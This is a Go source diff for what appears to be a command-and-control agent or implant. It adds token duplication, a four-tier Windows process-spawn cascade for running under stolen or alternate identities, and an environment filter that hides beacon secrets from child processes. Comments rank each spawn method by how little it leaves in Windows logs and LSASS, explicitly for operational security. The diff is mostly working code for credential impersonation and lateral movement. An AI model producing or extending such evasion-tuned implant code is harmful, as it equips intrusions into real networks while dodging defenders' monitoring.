@@ -411,6 +411,39 @@ func spawnasCommand(command string, cfg *config) (string, error) {
 		sessionID, pid, identityLabel(payload.Domain, payload.User)), nil
 }
 
+// runasEnvironment builds the deliberately restricted environment for runas
+// child processes. The child runs under a different identity and must not
+// receive the agent's beacon credentials, session configuration, or arbitrary
+// inherited variables. CreateProcessWithLogonW receives this exact environment
+// block: LOGON_WITH_PROFILE loads the user's registry profile but does not add
+// USERPROFILE, TEMP, APPDATA, or other per-user variables. Operators that need
+// such values must set them explicitly in the command after resolving suitable
+// paths under the target identity.
+func runasEnvironment() []string {
+	allowlist := map[string]bool{
+		"SYSTEMROOT":  true,
+		"SYSTEMDRIVE": true,
+		"PATH":        true,
+		"COMSPEC":     true,
+		"WINDIR":      true,
+		"PATHEXT":     true,
+	}
+	var env []string
+	for _, entry := range os.Environ() {
+		key, _, _ := strings.Cut(entry, "=")
+		upper := strings.ToUpper(key)
+		// Block all RMM_* keys unconditionally — they carry beacon secrets,
+		// session identity, and proxy configuration.
+		if strings.HasPrefix(upper, "RMM_") {
+			continue
+		}
+		if allowlist[upper] {
+			env = append(env, entry)
+		}
+	}
+	return env
+}
+
 // runasCommand handles __RUNAS__: run a shell command under a different identity
 // and return its output using CreateProcessWithLogonW.
 func runasCommand(command string) (string, error) {
@@ -423,43 +456,252 @@ func runasCommand(command string) (string, error) {
 	defer cancel()
 
 	out, err := runWithPipesLogonW(ctx, payload.User, payload.Domain, payload.Password,
-		shellArgs, buildEnvBlock(os.Environ()))
+		shellArgs, buildEnvBlock(runasEnvironment()))
 	if err != nil {
 		return fmt.Sprintf("runas error: %v\noutput: %s", err, out), nil
 	}
 	return out, nil
 }
 
-// startDetachedAgent uses CreateProcessA and the process primary identity.
-// An active thread impersonation token is diagnostic context only.
-func startDetachedAgent(command *exec.Cmd, diagnostics ...*spawnDiagnostics) (int, string, bool, error) {
+var (
+	procCreateProcessAsUserW    = advapi32.NewProc("CreateProcessAsUserW")
+	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
+	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
+)
+
+const (
+	// DuplicateTokenEx constants.
+	tokenDuplicate        = 0x0002
+	tokenQuery            = 0x0008
+	tokenAssignPrimary    = 0x0001
+	tokenImpersonate      = 0x0004
+	securityImpersonation = 2
+	tokenTypePrimary      = 1
+
+	// CreateProcessWithTokenW logon flags.
+	// LOGON_NETCREDENTIALS_ONLY (2) avoids profile loading and keeps the
+	// netonly semantics quiet — no registry hive mount, no GPO folder
+	// redirection, minimum OPSEC footprint.
+	logonNetcredentialsOnly = 2
+)
+
+// duplicateTokenToPrimary creates a primary token from the make_token handle.
+// The duplicate preserves the type-9 logon session, so the child inherits
+// netonly semantics: local identity = agent, network identity = alternate.
+// The caller must close the returned handle.
+func duplicateTokenToPrimary(source syscall.Token) (syscall.Handle, error) {
+	var primary syscall.Handle
+	access := uint32(tokenDuplicate | tokenQuery | tokenAssignPrimary | tokenImpersonate)
+	ok, _, err := procDuplicateTokenEx.Call(
+		uintptr(source),
+		uintptr(access),
+		0, // default security attributes
+		securityImpersonation,
+		tokenTypePrimary,
+		uintptr(unsafe.Pointer(&primary)),
+	)
+	if ok == 0 {
+		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
+	}
+	return primary, nil
+}
+
+// startDetachedAgent implements the 4-echelon spawn cascade when a make_token
+// identity is active:
+//
+//  1. CreateProcessAsUserW — duplicated primary token, needs SeAssignPrimaryTokenPrivilege.
+//     Netonly: local = agent, network = alternate. No 4624, no LSASS.
+//  2. CreateProcessWithTokenW — same token, needs SeImpersonatePrivilege.
+//     Uses LOGON_NETCREDENTIALS_ONLY for minimum noise.
+//  3. CreateProcessWithLogonW — plaintext creds, full type-2 logon.
+//     WARNING: deposits credentials in LSASS.
+//  4. CreateProcessA — agent identity, unconditional fallback.
+//
+// Without make_token, only echelon 4 runs.
+func startDetachedAgent(command *exec.Cmd, diagnostics ...*spawnDiagnostics) (int, string, bool, credentialExposure, error) {
 	tokenMu.Lock()
 	token, active, credentials := activeToken, tokenActive, spawnCredentials
+	// Snapshot the identity string under the same lock so diagnostics
+	// never read mutable global state after unlock.
+	identity := tokenIdentity
+	// Duplicate the token to a primary token while we still hold tokenMu.
+	// This eliminates the race where rev2self closes activeToken between
+	// our unlock and a later DuplicateTokenEx call inside a closure.
+	var ownedPrimary syscall.Handle
+	tokenPropagationOK := false
+	if active && token != 0 {
+		var dupErr error
+		ownedPrimary, dupErr = duplicateTokenToPrimary(token)
+		if dupErr != nil {
+			// Token duplication failed; propagation is unavailable but
+			// credentials may still allow echelon 3.
+			tokenPropagationOK = false
+		} else {
+			tokenPropagationOK = true
+		}
+	}
 	tokenMu.Unlock()
+	// active tracks whether the operator requested an alternate identity.
+	// It stays true even if the token could not be duplicated — echelon 3
+	// can still use stored credentials. tokenPropagationOK gates echelons 1 & 2.
 	active = active && token != 0
+	if ownedPrimary != 0 {
+		defer syscall.CloseHandle(ownedPrimary)
+	}
+	hasCreds := active && credentials.user != ""
 	line := buildWindowsCmdLine(command.Args)
 	for _, entry := range command.Env {
 		if strings.ContainsRune(entry, 0) {
-			return 0, "", false, errors.New("invalid spawn environment")
+			return 0, "", false, "", errors.New("invalid spawn environment")
 		}
 	}
 	env := buildEnvBlock(command.Env)
 	flags := uint32(createUnicodeEnv | createNoWindow | syscall.CREATE_NEW_PROCESS_GROUP)
+
+	// Populate diagnostics using snapshotted values only. The network
+	// identity was captured under tokenMu above; token queries use
+	// ownedPrimary (our safe duplicate), never the original activeToken
+	// which rev2self could close concurrently.
 	if len(diagnostics) > 0 && diagnostics[0] != nil {
 		detail := diagnostics[0]
 		detail.ProcessIdentity = processUserIdentity()
-		detail.ActiveToken, detail.CredentialsAvailable = active, active && credentials.user != ""
+		if active {
+			detail.NetworkIdentity = identity
+		}
+		detail.ActiveToken, detail.CredentialsAvailable = active, hasCreds
 		detail.CreationFlags, detail.TokenType = flags, "none"
 		if processToken, openErr := syscall.OpenCurrentProcessToken(); openErr == nil {
 			detail.ProcessPrivileges = spawnTokenPrivileges(processToken)
 			_ = processToken.Close()
 		}
-		if active {
-			detail.TokenType = spawnTokenType(token)
-			detail.TokenPrivileges = spawnTokenPrivileges(token)
+		if ownedPrimary != 0 {
+			detail.TokenType = spawnTokenType(syscall.Token(ownedPrimary))
+			detail.TokenPrivileges = spawnTokenPrivileges(syscall.Token(ownedPrimary))
 		}
 	}
-	methods := spawnMethods{original: func() (int, error) {
+
+	// Encode paths once for the Unicode API calls (echelons 1 & 2).
+	execPath := command.Path
+	execPtr, encodeWideErr := syscall.UTF16PtrFromString(execPath)
+	cmdLineWide, cmdLineWideErr := syscall.UTF16PtrFromString(line)
+	// Compute the actual UTF-16 element count (including the null terminator)
+	// by encoding the string properly. len(line)+1 counts UTF-8 bytes, NOT
+	// UTF-16 code units, and would overread on non-ASCII paths.
+	cmdLineWideSlice, _ := syscall.UTF16FromString(line)
+	cmdLineWideLen := len(cmdLineWideSlice) // includes null terminator
+
+	methods := spawnMethods{}
+
+	// Echelon 1: CreateProcessAsUserW with pre-duplicated primary token.
+	// ownedPrimary was duplicated under tokenMu above, so rev2self closing
+	// activeToken cannot race with our handle.
+	if tokenPropagationOK {
+		methods.createProcessAsUser = func() (int, error) {
+			if encodeWideErr != nil {
+				return 0, encodeWideErr
+			}
+			if cmdLineWideErr != nil {
+				return 0, cmdLineWideErr
+			}
+			if ownedPrimary == 0 {
+				return 0, errors.New("token revoked before CreateProcessAsUserW")
+			}
+			// Re-duplicate so each echelon owns its own handle lifetime.
+			// Convert Handle→Token for the duplicateTokenToPrimary signature.
+			primary, dupErr := duplicateTokenToPrimary(syscall.Token(ownedPrimary))
+			if dupErr != nil {
+				return 0, dupErr
+			}
+			defer syscall.CloseHandle(primary)
+
+			si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
+			var pi spawnasProcessInformation
+			// CreateProcessAsUserW may modify the command-line buffer.
+			cmdLineCopy := make([]uint16, cmdLineWideLen)
+			copy(cmdLineCopy, unsafe.Slice(cmdLineWide, cmdLineWideLen))
+
+			ok, _, callErr := procCreateProcessAsUserW.Call(
+				uintptr(primary),
+				uintptr(unsafe.Pointer(execPtr)),
+				uintptr(unsafe.Pointer(&cmdLineCopy[0])),
+				0, 0, 0,
+				uintptr(flags),
+				uintptr(unsafe.Pointer(&env[0])),
+				0,
+				uintptr(unsafe.Pointer(&si)),
+				uintptr(unsafe.Pointer(&pi)),
+			)
+			if ok == 0 {
+				return 0, callErr
+			}
+			syscall.CloseHandle(pi.Thread)
+			syscall.CloseHandle(pi.Process)
+			return int(pi.ProcessId), nil
+		}
+	}
+
+	// Echelon 2: CreateProcessWithTokenW.
+	// Uses LOGON_NETCREDENTIALS_ONLY to minimise noise — no profile load,
+	// token already carries the type-9 logon session.
+	if tokenPropagationOK {
+		methods.createProcessWithToken = func() (int, error) {
+			if encodeWideErr != nil {
+				return 0, encodeWideErr
+			}
+			if cmdLineWideErr != nil {
+				return 0, cmdLineWideErr
+			}
+			if ownedPrimary == 0 {
+				return 0, errors.New("token revoked before CreateProcessWithTokenW")
+			}
+			// Re-duplicate so each echelon owns its own handle lifetime.
+			// Convert Handle→Token for the duplicateTokenToPrimary signature.
+			primary, dupErr := duplicateTokenToPrimary(syscall.Token(ownedPrimary))
+			if dupErr != nil {
+				return 0, dupErr
+			}
+			defer syscall.CloseHandle(primary)
+
+			si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
+			var pi spawnasProcessInformation
+			cmdLineCopy := make([]uint16, cmdLineWideLen)
+			copy(cmdLineCopy, unsafe.Slice(cmdLineWide, cmdLineWideLen))
+
+			ok, _, callErr := procCreateProcessWithTokenW.Call(
+				uintptr(primary),
+				logonNetcredentialsOnly,
+				uintptr(unsafe.Pointer(execPtr)),
+				uintptr(unsafe.Pointer(&cmdLineCopy[0])),
+				uintptr(flags),
+				uintptr(unsafe.Pointer(&env[0])),
+				0,
+				uintptr(unsafe.Pointer(&si)),
+				uintptr(unsafe.Pointer(&pi)),
+			)
+			if ok == 0 {
+				return 0, callErr
+			}
+			syscall.CloseHandle(pi.Thread)
+			syscall.CloseHandle(pi.Process)
+			return int(pi.ProcessId), nil
+		}
+	}
+
+	// Echelon 3: CreateProcessWithLogonW with stored plaintext credentials.
+	// This performs a real type-2 interactive logon — 4624 on the local box,
+	// credentials cached in LSASS. Only used when echelons 1 and 2 fail.
+	if hasCreds {
+		methods.createProcessWithLogon = func() (int, error) {
+			pid, logonErr := spawnWithLogonDetached(
+				credentials.user, credentials.domain, credentials.password,
+				execPath, command.Args, command.Env,
+			)
+			return int(pid), logonErr
+		}
+	}
+
+	// Echelon 4: CreateProcessA — always available.
+	methods.original = func() (int, error) {
 		app, encodeErr := spawnANSI(command.Path)
 		if encodeErr != nil {
 			return 0, encodeErr
@@ -480,8 +722,9 @@ func startDetachedAgent(command *exec.Cmd, diagnostics ...*spawnDiagnostics) (in
 		_ = syscall.CloseHandle(pi.Thread)
 		_ = syscall.CloseHandle(pi.Process)
 		return int(pi.ProcessId), nil
-	}}
-	return dispatchSpawn(active, methods, diagnostics...)
+	}
+
+	return dispatchSpawn(active, hasCreds, methods, diagnostics...)
 }
 
 // spawnANSI converts paths and arguments to the system ANSI code page without
